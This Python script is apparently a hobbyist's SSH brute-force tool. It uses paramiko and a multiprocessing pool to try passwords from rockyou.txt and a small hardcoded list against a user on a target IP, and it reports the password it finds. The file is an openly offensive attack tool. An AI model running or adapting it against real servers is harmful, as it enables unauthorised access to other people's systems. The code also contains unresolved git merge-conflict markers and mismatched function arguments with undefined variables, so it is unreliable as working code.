import multiprocessing as mp
import paramiko
import time
import optparse
from net_tools import get_ping

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP of the server you want to brute force")
    parser.add_option("-u", "--user", dest="user", help="user name on the server")
    parser.add_option("-p", "--protocol", dest="protocol", help="Protocol you want to use (SSH, FTP...)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP address --help for more info")
    elif not options.protocol:
        parser.error("[-] Please specify a protocol, use --help for more info")
    elif not options.user:
        parser.error("[-] Please specify a username, use --help for more info")
    return options 

def ssh_attack(user,address,password,event,q):
    if not event.is_set():
        print('Testing password: ' + password)
        try :
            ssh.connect(address, username=user, password=password)
            array=password
            q.put(password)
            print(password)
            event.set()
            print('found')
            return True

        except paramiko.ssh_exception.AuthenticationException:
            return False

def init(vv):
    global v
    v = vv

if __name__ == '__main__':
    options = get_arguments()
    print("[+]Preparing brute force on server at IP "+ options.target)

    #Checking if the server can be pinged
    get_ping(str(options.target))

    #retrieving a dictionnary of password
    pass_list = ['test1','test2','test3', 'toor']

    #creating the ssh connection object
    ssh = paramiko.SSHClient()

    #this is to add new host automatically
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#preparing dictionnary to read passwords
    f = open('pass.txt','r')
##############################3
#Preparing the multiprocessing
#Working with pool, because you cannot set the number of process with the process class

    #Preparing the pool
    pool = mp.Pool(processes=2)

    # Preparing the array to return the password value

    manager = mp.Manager()
    queue = manager.Queue() #This is needed to retrieve the final password
    event = manager.Event() #This is needed to stop the processing when password is found

    t1 = time.time()

    '''For Asynchronous'''
    #for x in pass_list:
    #    worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))

<<<<<<< HEAD
   # #while True:
    with open('rockyou.txt','r') as f:
        for x in f:
            x = x.strip()
            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))
            #print(x, type(x))
            if x.strip() == "" : continue
    print("The password is " + queue.get())

    print('Code executed in: '+ str(time.time() - t1))
    exit(0)

##############################3
##Working with process
#    for password in pass_list:
#       p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
#       p.start()
#
#       #p.join()
#    print("The password is " + q.get())
#    print(array[:])
=======
##############################3
#also check the manager.dict to retrieve value https://docs.python.org/2/library/multiprocessing.html
    for password in pass_list:
        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
        p.start()
        #print(q.get())
        #p.join()
    print(array[:])
>>>>>>> 95817bb2522b189fc22f53aea922f715241e1a4b
#########################33
    
